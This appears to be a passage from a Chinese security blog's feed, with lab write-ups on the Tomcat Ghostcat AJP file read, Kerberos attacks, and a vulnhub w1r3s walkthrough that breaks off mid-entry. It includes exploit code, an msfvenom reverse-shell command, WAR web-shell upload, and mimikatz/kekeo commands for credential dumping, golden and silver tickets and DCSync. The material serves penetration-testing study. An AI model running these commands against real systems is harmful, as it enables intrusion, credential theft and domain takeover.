class="hljs-built_in">int</span>, default=<span class="hljs-number">8009</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;AJP port to attack (default is 8009)&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)<br>args = parser.parse_args()<br>t = Tomcat(args.target, args.port)<br>_,data = t.perform_request(<span class="hljs-string">&#x27;/asdf&#x27;</span>,attributes=[<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]&#125;,<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]&#125;,<br>    ])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([d.data <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python2 ./CNVD-2020-10487.py 192.168.20.128 -p 53919 -f WEB-INF/web.xml # 该端口指向的就是8009端口，我们也可以读取其他的文件<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443236.png" alt="image-20240425144027308"></p><p><img src="http://cdn.clown2024.cn/202407151443237.png" alt="image-20240425144348040"></p><blockquote><p>不过只能读取ROOT目录下的文件，不能进行目录穿越读取上一级目录</p></blockquote><p>如果他还有文件上传的漏洞，就可以配合起来进行getshell</p><p>比如我们生成一个java的反弹shell的txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt<br></code></pre></td></tr></table></figure><p>上传到服务器之后，攻击机开启监听，再用该脚本读取shell.txt就能getshell</p><p><img src="http://cdn.clown2024.cn/202407151443238.png" alt="image-20240425145727189"></p><p>具体原理分析可以参考这篇文章：<a href="https://yq1ng.github.io/2021/05/19/cve-2020-1938-you-ling-mao-ghostcat-tomcat-ajp-xie-yi-ren-yi-wen-jian-du-qu-jsp-wen-jian-bao-han-lou-dong-fen-xi/">https://yq1ng.github.io/2021/05/19/cve-2020-1938-you-ling-mao-ghostcat-tomcat-ajp-xie-yi-ren-yi-wen-jian-du-qu-jsp-wen-jian-bao-han-lou-dong-fen-xi/</a></p><h2><span id="tomcat弱口令ampamp后台getshell">Tomcat弱口令&amp;&amp;后台getshell</span></h2><p>一般tomcat的默认账号密码就是tomcat，登陆之后我们就可以上传war包进行getshell</p><blockquote><p>将WAR文件添加到Tomcat的webapps目录下，然后启动或重启Tomcat服务器，Tomcat就可以自动解压WAR文件并启动web应用程序。</p></blockquote><p>所以我们只需要把我们的shell.jsp打包成war文件上传即可</p><p>先等manager app的后台</p><p><img src="http://cdn.clown2024.cn/202407151443239.png" alt="image-20240425152300741"></p><p>然后选择war包进行上传</p><p><img src="http://cdn.clown2024.cn/202407151443240.png" alt="image-20240425152404162"></p><p>打包war包命令如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">jar -cvf shell.war shell.jsp #也可以先压缩成zip，然后后缀改为war<br></code></pre></td></tr></table></figure><p>然后上传</p><p><img src="http://cdn.clown2024.cn/202407151443241.png" alt="image-20240425153056242"></p><p><img src="http://cdn.clown2024.cn/202407151443242.png" alt="image-20240425153149850"></p><p>可以看到已经成功了，然后拿哥斯拉连接即可</p><p><img src="http://cdn.clown2024.cn/202407151443243.png" alt="image-20240425153245619"></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos攻击专题</title>
      <link href="/2024/04/21/Kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/"/>
      <url>/2024/04/21/Kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1><span id="kerberos认证基础">Kerberos认证基础</span></h1><p>在内网渗透中,Kerberos认证协议是基于票据的一种认证方式，由美国麻省理工学院发明，简单理解可以分为三部分:用户(Client)、服务器(Server)和 KDC(Key Distribution Center,密钥分发中心)。KDC包含AS(Authentication Server，认证服务器)和TGS(Ticket Granting Server，票据授权服务器)。</p><h2><span id="kerberos基础认证流程">Kerberos基础认证流程</span></h2><p>其流程图如下：</p><p><img src="http://cdn.clown2024.cn/202407151511675.png" alt="image-20240421115735137"></p><p>解释如下：</p><ol><li>AS_REQ。CIient向AS发起AS_REQ，请求内容为通过Client的哈希加密的时间戳、ClientID 等内容。</li><li>AS_REP。AS使用Client密码哈希值进行解密，如果解密正确，就返回用krbtgt的 NTLM-hash 加密的 TGT(Ticket Granting Ticket,票据授权凭证)票据。TGT 包含 PAC(Privilege Attribute Certificate，特权属证书)，PAC包含 Client的相关权限信息，如 SID及所在的组。简单理解，PAC就是用于验证用户权限，只有KDC能制作和查看PAC。</li><li>TGS_REQ。Client 凭借 TGT向TGS 发起针对需要访问服务的 TGS_REQ 请求。</li><li>TGS_REP。TGS 使用 krbtgt的 NTLM-hash对TGT 进行解密，如果结果正确，就返回用服务 NTLM-hash加密的TGS票据(简称 ST)，并带上PAC。注意，在Kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT正确，就会返回ST。</li><li>AP_REQ。Client利用ST去请求服务。</li><li>AP_REP。服务使用自己的 NTLM-hash 解密 ST。如果解密正确，就会将其中的PAC 给KDC 解密，KDC由此判断Client是否有访问服务的权限。当然，如果没有设置PAC，就不会去KDC求证，这也是白银票据成功的原因。</li></ol><h2><span id="kerberos攻击分类">Kerberos攻击分类</span></h2><p>Kerberos攻击其实可以归结为两个字:票据,即常说的票据传递攻击(Pass The Ticket,PTT)。</p><p>这里有一张攻击分类图</p><p><img src="http://cdn.clown2024.cn/202407151440638.png" alt="image-20240421120946839"></p><h1><span id="as_reqampas_rep阶段攻击">AS_REQ&amp;AS_REP阶段攻击</span></h1><p><strong>域内用户枚举</strong></p><p>当机器不在域中时，可以通过Kerberos的ASREQ工作原理来进行枚举域内账号，由于用户名存在跟不存在的报错不一致，导致可以进行用户名相关枚举。</p><p><strong>密码喷洒攻击</strong></p><p>密码喷洒攻击是指对其他用户进行密码爆破，类似暴力破解。</p><p><strong>AS_REP Roasting攻击</strong></p><p>当被攻击账号设置“不需要Kerberos预身份验证”后，在ASREP过程中就可以任意伪造用户名请求票据，随后 AS 会将伪造请求的用户名 NTLMHash 加密后返回，然后便可以进行爆破。</p><p><strong>黄金票据攻击</strong></p><p>在Kerberos 认证中，每个用户的票据都是由 krbtgt的 NTLM 哈希值加密生成的，获得 krbtgt 的哈希值,便可以伪造任意用户的票据，这种攻击方式被称为黄金票据(GoldenTicket)。</p><p><img src="http://cdn.clown2024.cn/202407151511676.png" alt="image-20240421123213561"></p><p>攻击需要这些信息：域名，域sid，krbtgt哈希值，伪造的用户。</p><blockquote><p>域sid：</p><p>查询自己的SID可以通过：<code>whoami /user</code></p><p>查询其他用户的SID可以通过WMI查询：<code>wmic useraccount where name=%username% get sid</code></p><p>SID的形式：S-1-5-21-&lt;域标识&gt;-&lt;相对标识&gt;</p><ul><li>“S-1”表示该标识是一个SID。</li><li>“5”表示这是一个Windows服务器或域的标识。</li><li>“21”是一个固定值，用于指示该SID是一个域SID。</li><li>“&lt;域标识&gt;”是一个唯一的域标识符，用于标识特定的域。</li><li>“&lt;相对标识&gt;”是一个相对于域的唯一的标识符，用于唯一标识域中的安全主体。</li></ul><p>常见的SID列表：</p><ul><li>S-1-5-18 (LocalSystem)</li><li>S-1-5-19 (LocalService)</li><li>S-1-5-20 (NetworkService)</li><li>S-1-5-32-544 (Administrators)</li><li>S-1-5-32-545 (Users)</li><li>S-1-5-32-550 (PrintOperators)</li></ul></blockquote><ol><li><p>在DC用mimikatz执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440640.png" alt="image-20240421122849443"></p></li><li><p>得到krbtgt的哈希值后，先在win2008上访问DC的CIFS服务，发现不可访问，再利用mimikatz生成的黄金票据导入</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-752537975-3696201862-1060544381 /krbtgt:1fd539dboac55db506018c72586bb3a6 /ticket:ticket.kirbi<br>Kerberos::ptt ticket.kirbi<br></code></pre></td></tr></table></figure></li><li><p>再次访问就会成功</p><p><img src="http://cdn.clown2024.cn/202407151440641.png" alt="image-20240421123805145"></p></li></ol><blockquote><p>注意，跨域下的黄金票据有一定限制，但利用SidHistory 便可解决</p></blockquote><h1><span id="tgs_reqamptgs_rep阶段攻击">TGS_REQ&amp;TGS_REP阶段攻击</span></h1><h2><span id="kerberosast攻击">Kerberosast攻击</span></h2><p>这里要先了解一下SPN。SPN(Service Principal Name，服务器主体名称)是服务器所运行服务的唯一标识，每个使用Kerberos 认证的服务都必须正确配置相应的 SPN，一个账户下可以有多个 SPN。根据权限，SPN有两种注册方式，分别为:机器账户 computers、域用户账户 users。KDC 查询 SPN也按照账户方式进行查找。</p><p>Kerberosast 攻击主要利用了 TGS_REP 阶段使用服务的 NTLM Hash返回的加密数据，对于域内的任何主机，都可以通过查询 SPN，向域内的所有服务请求 ST(因为 KDC不会验证权限)，然后进行暴力破解，但只有域用户的 SPN 是可以利用的(这是因为机器账户的 SPN每 30 天会更改随机 128 个字符密码导致无法被破解)，所以在实际过程中要注意攻击的是域用户。当然，如果该SPN没有注册在域用户下，就可以尝试进行注册再利用 hashcat 破解即可</p><h2><span id="白银票据攻击">白银票据攻击</span></h2><p>如果在未配置 PAC 的情况下，服务的哈希被泄露，就可以伪造任何人的身份进入而没有检查，这种攻击称为白银票据(Silver Ticket)。其原理是通过伪造 ST 来访问服务,但是只能访问特定服务器上的部分服务。</p><p><img src="http://cdn.clown2024.cn/202407151511677.png" alt="image-20240421142236322"></p><p>假设已获得 DC 机器账户的哈希值,便可以使用银票访问其LDAP 服务执行DCSync也可以伪造其他服务造成其他危害，如对 CIFS 服务则可以实现完全的远程文件访问等等。攻击需要以下信息:域名，域sid，DC 机器账户的 hash，伪造的任意用户名。攻击流程如下：</p><ol><li><p>在DC上以管理员权限用mimikatz执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimkatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br></code></pre></td></tr></table></figure><p>然后就可以获得DC机器名的哈希值。</p></li><li><p>分别执行下面命令，获得krbtgt用户的hash从而制作黄金票据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-1431000434-12531824-1301847844 /target:dc.hack-my.com /service:ldap /rc4:c890a8745007ebe3c21afc1cb8cd0a91 /user:venenof /ptt<br>lsadump:dcsync /domain:hack-my.com /user:krbtgt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440643.png" alt="image-20240421143421648"></p></li></ol><h2><span id="委派攻击">委派攻击</span></h2><p>在现实情况下，往往多个服务不可能在一台机器中，那么如果用户在使用服务A时，这时候需要服务B上属于自己的数据,最简单的方式就是A代用户去请求B返回相应的信息，这个过程就是委派。</p><p>委派攻击分为非约束委派、约束委派、基于资源的约束委派三种。</p><h3><span id="非约束委派攻击">非约束委派攻击</span></h3><p>非约束委派的请求过程如下，具体的可以去查看微软的手册</p><p><img src="http://cdn.clown2024.cn/202407151511678.png" alt="image-20240516175227543"></p><p>大概就是当 service1 的服务账户开启了非约束委派后，user 访问 service1 时，service1 会将user 的 TGT 保存在内存中，然后 servicel 就可以利用 TGT以 user 的身份去访问域中的任何user 可以访问的服务</p><p>如果域管理员访问了开启非约束委派的服务，该服务所在的计算机就会保存域管理员的TGT在内存中，那么就可以获取其特权就可以获取域控权限。</p><p>攻击过程如下：</p><p>我们可以先将域内的一台主机比如win2008设置非约束委派</p><p><img src="http://cdn.clown2024.cn/202407151440645.png" alt="image-20240516180439225"></p><ol><li><p>当服务账号或主机被设置为非约束委派时，其userAccountControl属性包含TRUSTED_FOR_DELEGATION这个flag值，对应是0x80000。</p><p>其中524288对应0x80000，而805306369对应0x30000000，即代表的是机器账户</p><p>可以用adfind在域内查找非约束委派用户：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">AdFind.exe -b <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType =805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440646.png" alt="image-20240516181059560"></p></li><li><p>我们可以利用mimikatz查看win2008内存中的票据</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>当域管理员访问该主机的服务之后，就可以查看到域管理员的票据，比如访问CIFS服务后</p><p><img src="http://cdn.clown2024.cn/202407151440647.png" alt="image-20240516181339603"></p></li></ol><p>不过该攻击方式过于被动，需要等待域管理员去访问才行，我们可以利用Spooler打印机服务让域控主动连接。</p><p>在 Spooler 服务默认开启的情况下，域用户可以利用 Windows 打印系统远程协议(MS-RPRN)强制任何运行了 Spooler 服务的域内计算机通过Kerberos 或 NTLM 对任何目标进行身份验证，这便是该攻击方式的原理。</p><p>攻击过程：</p><ol><li><p>DC的spooler开启，在win2008上利用Rubenus对域控机器账户的登陆监听(需要本地管理员权限)</p></li><li><p>利用SpoolSample工具强制DC对win2008进行认证</p></li><li><p>利用Rubenus导入TGT</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Rubenus.exe ptt /ticket:<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure></li><li><p>利用mimikatz进行dcsync成功获取哈希值，制作黄金票据接管域控</p></li></ol><blockquote><p>注意，这里获取的 TGT 实际上是DC的机器账户，而机器账户是没有相应权限访问 cifs 服务的，但是在 LDAP 服务中，机器账户会被当做域控主机，从而可以dcsync。</p></blockquote><h3><span id="约束委派攻击">约束委派攻击</span></h3><p>由于非约束委派的不安全，微软在winserver2003引入了约束委派，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p><p>S4U2Self用于生成本身服务 TGS 票据，S4U2porxy用于“代理”相关用户申请其他服务票据。请求过程如图：</p><p><img src="http://cdn.clown2024.cn/202407151511679.png" alt="image-20240516191222724"></p><blockquote><p> 其中前4步为S4U2Self，后6步为S4U2proxy。</p></blockquote><p>总结一下就是：S4U2self是service1代表用户请求的自身可转发ST，但是不能以该用户身份请求另外的服务，意味着S4U2Self必须在具有SPN的账户上操作；S4U2proxy则是service1以S4U2self阶段的可转发ST(其中包含用户相关的身份信息)代表用户去请求service2的ST。</p><p>而在 S4U2proxy 过程会通过判断 msds-allowedtodelegateto 里的 SPN值来确定是否可以申请到 service2的 ST,所以这也是约束委派与非约束委派的最大区别即只能访问特定的服务。注意,约束委派的前置条件服务自身需要通过 KDC 认证的 TGT。</p><p>根据上述过程，如果我们获取了service1的权限，既可以伪造S4U先请求service1本身的ST，然后就可以利用此ST便可以伪造任意用户请求获取service2的ST。</p><h3><span id="基于资源的约束委派">基于资源的约束委派</span></h3><p>基于资源的约束委派(Resource Based Constrained Delegation,RBCD)是在 WindowsServer 2012 中加入的功能,与传统约束委派相比,不需要域管理员权限去设置相关属性，而是将设置委派的权限交给了服务机器。</p><p>服务机器在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性，就可以进行基于资源的约束委派。可以将其理解为传统约束委派的反向过程。以A、B两个服务为例，前者通过需要在 DC上设置A的msDS-AllowedToDelegateTo属性，后者则设置B的msDS-AllowedToActOnBehalfOf-OtherIdentity 属性，即设置A的 SID。注意，基于资源的约束委派的S4U2self阶段的ST是不可转发的。</p><p>所以，基于资源的约束委派攻击的重点是上述属性的设置，可以分为下面两种方式：</p><ul><li>如果能够修改服务B的该属性，将其更新为可控制的SPN账户的SID，既可以伪造任意用户获得服务B的相关权限，从而实现变相提权。</li><li>利用realy攻击，首要条件是relay攻击。</li></ul><h1><span id="pac攻击">PAC攻击</span></h1><h2><span id="ms14-068">MS14-068</span></h2><p>MS14-068 漏洞的原因是 KDC 无法正确检查 PAC 中的有效签名，由于其实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证，因此可以利用不需要相关密钥的算法，如MD5，实现内容的任意更改，导致用户可以自己构造一张 PAC，伪造用户的 SID 和所在的组。那么，可以通过伪造 PAC，加入域管相关信息，访问域控服务，KDC会认为当前用户有权限，从而把这个用户当作域管组的成员，进而达到提升为域管理员的效果。</p><p>利用kekeo执行如下命令便可以成功访问CIFS服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440649.png" alt="image-20240516184624079"></p><h2><span id="cve-2021-4227ampcve-2021-42287nopac">CVE-2021-4227&amp;CVE-2021-42287(NoPac)</span></h2><p>这两个CVE是活动目录域服务漏洞，这两个漏洞配合利用可以绕过安全限制进行权限提升。</p><p>CVE-2021-42278 是一个安全绕过漏洞，允许通过修改机器账户的sAMAccountName属性来冒充域控制器。与标准用户账户相比，机器账户的名称末尾附加了“$”符号，但实际中，AD并没有验证域内机器账户中是否具有“$”，导致机器账户可以被假冒。</p><p>CVE-2021-42287是影响Kerberos特权属性证书(PAC)的安全绕过漏洞，允许通过假冒域控制器，使密钥分发中心(KDC)创建高权限票据。</p><p>根据认证 Kerberos 协议，在请求服务票证前需要先签发 TGT(票据授权凭证)。但是，当为活动目录中不存在的账户请求服务票证时，密钥分发中心(KDC)将在该账户名上附加“$”符号进行搜索。将这一行为与 CVE-2021-42278 结合，测试人员可以实现域内权限提升，深入原理分析可以参考这篇文章：<a href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p><p>大致流程如下：</p><ol><li>创建机器账户，假设为HACKME$</li><li>清除机器账户 HACKME$的 servicePrincipalName 属性</li><li>修改机器账户 HACKME$的 sAMAccountName属性，使其指向不带“$”符号的域控制器账户。</li><li>利用账户DC-1请求TGT</li><li>将新建的机器账户的 sAMAccountName 属性恢复为其原始值(HACKME$)或其他任何值。</li><li>利用S4U代表域管理员请求对应服务的服务票据(ST)。</li><li>伪造域管理员账户获得相应服务的ST</li></ol><p>具体的等有机会再复现</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w1r3s.v1.0.1靶场学习</title>
      <link href="/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="靶场介绍">靶场介绍</span></h1><p>这是一个vulnhub里的一个初级的渗透靶场，主要是为了熟悉一下各个信息搜集工具的使用，以及跟着红队笔记的视频来学习一下渗透思路打一下基础。</p><p>这里的环境就一台靶机，直接打开vmx即可进行测试。</p><h1><span id="信息搜集">信息搜集</span></h1><h2><span id="主机存活探测">主机存活探测</span></h2><p>渗透第一步需要做的就是信息搜集，我们先要确定主机的存活，确认我们要攻击的主机。</p><p>这里用几种方式来进行探测主机存活</p><p><strong>namp</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sn 192.168.20.0/24 # -sn 采用四种不同类型的数据包探测目标主机是否在线，只进行主机探测不进行端口扫描<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444504.png" alt="image-20240419192322268"></p><p><strong>arp-scan</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444505.png" alt="image-20240419192521545"></p><p>经过上面两种探测之后可以知道我们的目标靶机就是192.168.20.129，接下来就是对端口进行扫描搜集一下有哪些服务</p><h2><span id="端口扫描探测">端口扫描探测</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sT 192.168.20.129 # -sT 使用TCP进行端口扫描<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以用这个命令扫描制定其他要求</span><br>nmap -sT --min-rate 10000 -p- 192.168.20.129 -oA nmap/ports# --min-rate，设置最低发包速率，这里为每秒一万次；-p- 是扫描1-65535端口的简化写法；-oA 将结果的所有格式都导出来，如果端口多的话可以方便我们查看保存下来<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444506.png" alt="image-20240419192855002"></p><p><img src="http://cdn.clown2024.cn/202407151444507.png" alt="image-20240419222045487"></p><p><img src="http://cdn.clown2024.cn/202407151444508.png" alt="image-20240419222030200"></p><p>发现这里开启了ftp、ssh、http、mysql服务</p><p>红队笔记这里还有一个很好的习惯，就是把端口提取出来，如果端口太多的话这样就会会很方便，现在我们从文件中将这四个端口提取出来，然后我们将其赋值给一个变量就可以直接用就会方便很多</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">grep open ports.nmap <br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; #就是以斜杠为分隔符，然后打印第一个字段<br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27; #将字符合并到一行并以逗号为分隔符<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里 awk 默认会将每一行作为一个记录来处理</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444509.png" alt="image-20240419223441495"></p><p><img src="http://cdn.clown2024.cn/202407151444510.png" alt="image-20240419223456921"></p><p><img src="http://cdn.clown2024.cn/202407151444511.png" alt="image-20240419223537108"></p><p>这样就可以赋值给一个变量，然后-p参数就能直接探测该变量中的端口了</p><p>接下来确认端口之后就对这些端口的具体服务信息进行扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ports=$(grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br>nmap -sT -sV -sC -O -p $ports -oA nmap/details<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-sV 探测服务版本；-sC 使用默认脚本扫描 -O 探测操作系统版本</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444512.png" alt="image-20240419224852873"></p><p>这样我们就搜集到了相关的信息就可以开始选择性开始对具体端口进行渗透</p><p>还可以使用fscan直接一条命令扫出来</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444513.png" alt="image-20240419225047643"></p><h1><span id="开始渗透">开始渗透</span></h1><h2><span id="ftp服务">ftp服务</span></h2><p>从上面可以看是一个ftp匿名服务器，我们就可以直接登陆看看有什么东西</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ftp 192.168.20.129 #匿名ftp用户名都是anonymous<br></code></pre></td></tr></table></figure><p>这里列一下ftp常用命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">查看指定后缀文件<br>dir .jpg<br><br>删除单个文件<br>delete 文件名<br><br>删除多个文件<br># 格式：mdelete remote-files [ ...]<br>mdelete 文件名<br><br>重命名文件<br># 格式：rename filename newfilename<br>rename test atest<br><br>上传文件<br># 格式：put local-file [remote-file]<br>put /home/a.txt /mydata/b.txt<br><br>下载单个文件<br># 格式：get [remote-file] [local-file]<br>get /mydata/a.txt /apps/b.txt<br><br>下载多个文件<br># 格式：mget filename [filename ....]<br>mget *.*<br><br>输入?可以查看所有指令<br></code></pre></td></tr></table></figure><p>登陆之后看看都有什么</p><p><img src="http://cdn.clown2024.cn/202407151444514.png" alt="image-20240419225708258"></p><p>我们可以输入binary切换成二进制传输模式，防止有些可执行文件损坏</p><p><img src="http://cdn.clown2024.cn/202407151444515.png" alt="image-20240419230254565"></p><p>然后我们进去这些目录把文件都下载下来，我们可以使用<strong>prompt</strong>命令关掉交互模式，这样下载文件就不需要我们确认更加方便</p><p><img src="http://cdn.clown2024.cn/202407151444516.png" alt="image-20240419230904141"></p><p>然后去查看一下文件内容看有没有什么提示</p><p><img src="http://cdn.clown2024.cn/202407151444517.png" alt="image-20240419231041052"></p><p>给了一串md5和base64的字符串，去解码看一下有什么用</p><p>md5解密出来为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This is not a password<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444518.png" alt="image-20240419231247620"></p><p>base64解密出来</p><p><img src="http://cdn.clown2024.cn/202407151444519.png" alt="image-20240419231341272"></p><p>然后就是一些员工名单：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources<br></code></pre></td></tr></table></figure><p>然后就是下面的翻转文字，这里截图旋转一下</p><p><img src="http://cdn.clown2024.cn/202407151444520.png" alt="image-20240419231602348"></p><p>似乎就是提示从这里入手不太行</p><p>然后还发现了一个有意思的，这些文字logo网上可以找到ascii转logo的网站，这里是一个网站：<a href="https://patorjk.com/software/taag/#p=testall&f=Isometric2&t=helloworld%0A">https://patorjk.com/software/taag/#p=testall&amp;f=Isometric2&amp;t=helloworld%0A</a></p><p><img src="http://cdn.clown2024.cn/202407151444521.png" alt="image-20240419231939106"></p><h2><span id="80端口">80端口</span></h2><p>这里不太行就开始看一些他的http页面吧</p><p>进去之后是一个apache的页面</p><p><img src="http://cdn.clown2024.cn/202407151444522.png" alt="image-20240419232336159"></p><p>找不到什么能用的东西就直接开始端口扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dirsearch -u &quot;http://192.168.20.129/&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444523.png" alt="image-20240419232812060"></p><p>这里还学到一个新的目录扫描工具gobuster，他的扫描命令如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.129/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">其他的字典可以去该目录下查看</span><br></code></pre></td></tr></table></figure><blockquote><p>gobuster的三种模式</p><p>dir：传统的目录爆破模式；<br>dns：DNS子域名爆破模式；<br>vhost：虚拟主机爆破模式；</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444524.png" alt="image-20240419233246596"></p><p>现在去相关端口看看有什么东西</p><p>前面两个都访问不了，最后一个有东西，似乎是一个cms的安装界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://192.168.20.129/administrator/installation/<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444525.png" alt="image-20240419233413396"></p><p><img src="http://cdn.clown2024.cn/202407151444526.png" alt="image-20240419233448024"></p><p>这里吓得我不敢继续了，要是覆盖了这咋整正常人谁把这玩意放上来啊（</p><p>然后随便填了东西试了一下</p><p><img src="http://cdn.clown2024.cn/202407151444527.png" alt="image-20240419233619820"></p><p>root用户是无法创建的</p><p>emmm然后有点无从入手了，因为也不知道是什么cms，这是我把鼠标移到问号上在底下突然有了提示，是Cuppa CMS</p><p><img src="http://cdn.clown2024.cn/202407151444528.png" 